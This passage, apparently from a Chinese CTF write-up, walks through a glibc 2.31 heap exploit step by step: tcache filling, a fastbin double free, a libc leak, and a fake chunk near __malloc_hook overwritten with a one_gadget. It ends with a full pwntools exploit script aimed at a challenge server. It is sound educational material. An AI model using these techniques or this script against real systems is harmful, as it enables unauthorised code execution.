的 double free 的检查很严用不了，所以释放 7 个同大小 chunk 填满 tcache，使之后的 chunk 被放入 fastbin，再利用 fastbin 的 double free。这需要目标地址附近能构造 fake chunk。</p>\n<p>由于 free_hook 附近比我的脑子还空，所以只能利用 malloc_hook，然后覆写为 one_gadget。</p>\n<p><img data-src=\"./image-20231019213451394.png\" alt=\"image-20231019213451394\"></p>\n<h3 id=\"步骤-3\"><a class=\"markdownIt-Anchor\" href=\"#步骤-3\">#</a> 步骤</h3>\n<p>分配一堆 chunk，其中 chunk3-12 用于对齐之后伪造的 unsorted chunk，最后分配个 chunk13，防止 unsort chunk 与 top chunk 合并。</p>\n<h4 id=\"泄露libc地址-2\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址-2\">#</a> 泄露 libc 地址</h4>\n<p>释放 chunk0 后再分配，同时覆写 chunk1 的大小为 0x81。释放 chunk1，再输入大小 0x78 分配到 chunk1，覆写 chunk2 对应的 size 为 0x461。</p>\n<p>释放 chunk2，使其进入 unsorted bin。再次释放并分配 chunk1，填充 <code>'a'</code>  到 chunk2 的内容区。打印 chunk1 得到 mainarena+96 的地址。用 chunkList [16] 读取 chunk1，因为 chunkList [1] 等的 chunkInuse 已被置 0 无法调用显示函数。</p>\n<h4 id=\"构造fake-chunk\"><a class=\"markdownIt-Anchor\" href=\"#构造fake-chunk\">#</a> 构造 fake chunk</h4>\n<p>在 malloc_hook 附近寻找适合的数据。找到个 0x7f 适合构建 fake chunk。</p>\n<p><img data-src=\"./image-20231019214339224.png\" alt=\"image-20231019214339224\"></p>\n<p>黄色为 prev_size，蓝色为 size，红色为需要覆写的地方。因此 fakechunk 的真实地址为 <code>mallochook-0x30-3</code> ，而其填充内容 <code>payload=b'\\0'*(0x20+3) + p64(one_gadget)</code> 。</p>\n<p><img data-src=\"./image-20231019215016659.png\" alt=\"image-20231019215016659\"> 该 fake chunk 释放时会进入 0x70 的 fastbin，所以之前分配了大量 0x70 真实大小的 chunk。释放 7 个 0x70 真实大小的 chunk。之后再释放一个同大小 chunk，并将其 fd 修改为 fake chunk 的地址。这里选择再利用 chunk1 和 chunk2 构造。修改 chunk2 的 size 为 0x71，释放 chunk1 后，再次利用 chunk1 修改其 fd。</p>\n<p>最后分配掉 tcache 里所有 chunk，程序会将 fastbin 内的 chunk 转化为 tcahce 里的 chunk，再次分配，直到分配到 fake chunk 并修改 malloc_hook 的值。</p>\n<h4 id=\"调用one_gadget\"><a class=\"markdownIt-Anchor\" href=\"#调用one_gadget\">#</a> 调用 one_gadget</h4>\n<p>malloc 非 0 值的时候是找不到合适的 one_gadget 的。但是观察到 rdi 的值与 malloc 时输入的 size 值是一致的，于是我尝试了一下 malloc (0)。</p>\n<blockquote>\n<p>在尝试 malloc (0) 这之前我打算修改 free_hook，然后 free 含有 <code>&quot;/bin/sh\\0&quot;</code>  的 chunk。因此试过 unsorted bin attack，unlink。这些都失败了，因为高版本对 unlink 的检查很严格。还打算尝试多次 tcache dup 修改 main_arena 中的 top chunk 的地址，使其指向 free_hook 附近，但是分配的 chunk 就会超过 30 次。最后想尝试 malloc_hook 指向 reaclloc，然后修改 realloc_hook 指向 one_gadget。在调整 malloc_hook 指向的起始位置的时候才发现了 rdi 的值的特点。</p>\n</blockquote>\n<p><img data-src=\"./image-20231019220812375.png\" alt=\"image-20231019220812375\"><img data-src=\"./image-20231019220839000.png\" alt=\"image-20231019220839000\"></p>\n<p><code>malloc(0)</code>  后是如下情况。<img data-src=\"./image-20231019221621145.png\" alt=\"image-20231019221621145\"></p>\n<p>rdx 也变成 0 了，可以用 0xe3b01 的 one_gadget 了。</p>\n<p>最后记得 malloc (0) 手写，毕竟已经收不到 <code>b&quot;the content:&quot;</code>  了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>isremote <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28449</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    isremote <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn_pe'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b *$rebase(0x1592)')</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    libc<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/glibc-all-in-one/2.31-0ubuntu9.7_amd64/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">#gdb.attach(p, 'b malloc')</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your Choice: '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'the content: \\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token keyword\">not</span> <span class=\"token string\">b'forbidden'</span> <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'1.Create Slot'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">printcont</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa60'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x460</span><span class=\"token operator\">//</span><span class=\"token number\">0x70</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\">#4 - 12</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa70'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'aa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#13</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x81'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#14-0</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x461</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#15-1</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1f</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'b'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#16-1</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>printcont<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'ab'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mainarena_96 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mainarena_96 <span class=\"token operator\">-</span> <span class=\"token number\">0x1ecbe0</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the libcbase is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>libcbase<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">if</span> isremote <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    onegadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b31</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>freehook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>   </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>mallochook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the freehook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>freehook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the malloc_hook is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mallochook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'the one_gadget is : </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>onegadget<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>fakechunk0 <span class=\"token operator\">=</span> mallochook <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span> <span class=\"token operator\">-</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>payload0 <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x3</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>onegadget<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>   <span class=\"token comment\">#4-10 7->tcache 0x7</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#18-1</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#fastbin -> 2</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"81\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x18</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>fakechunk0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#19-1</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'cc70'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token comment\"># tcache -> 2 -> fake</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token string\">b'cc'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>   <span class=\"token comment\">#from fastbin    #2</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>mal<span class=\"token punctuation\">(</span>payload0<span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'size: \\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "heap",
                "tcache",
                "double free",
                "fastbin attack",
                "chunk_extend_and_overlapping",
                "one_gadget",
                "malloc_hook",
                "free_hook"
            ]
        }
    ]
}